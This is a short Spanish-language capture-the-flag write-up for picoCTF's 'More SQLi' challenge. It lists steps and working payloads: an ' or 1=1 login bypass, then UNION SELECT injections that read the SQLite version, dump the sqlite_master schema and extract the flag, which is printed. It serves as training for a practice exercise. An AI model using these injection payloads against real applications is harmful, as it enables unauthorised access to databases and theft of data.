# More SQLi
Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:56505/).
Additional details will be available after launching your challenge instance.
SQLiLite

## Solución
1. Entrar al sitio.
2. Logearse como ' or 1=1;, tanto como user y password.
3.  Saber que version de sqlite tiene el sitio.
4. Saber las estructuras de las tablas que tiene el sitio, encontrar la tabla que contenga la bandera.
5. Seleccionar la tabla y ver la bandera.
```
3.
' union select sqlite_version(),2,3;
|City|Address|Phone|
|---|---|---|
|3.31.1|2|3|

4.
' union select sql,2,3 from sqlite_master;
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)

5.
' union select id,flag,3 from more_table;
|City|Address|Phone|
|---|---|---|
|1|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}|3|
|2|If you are here, you must have seen it|3|
```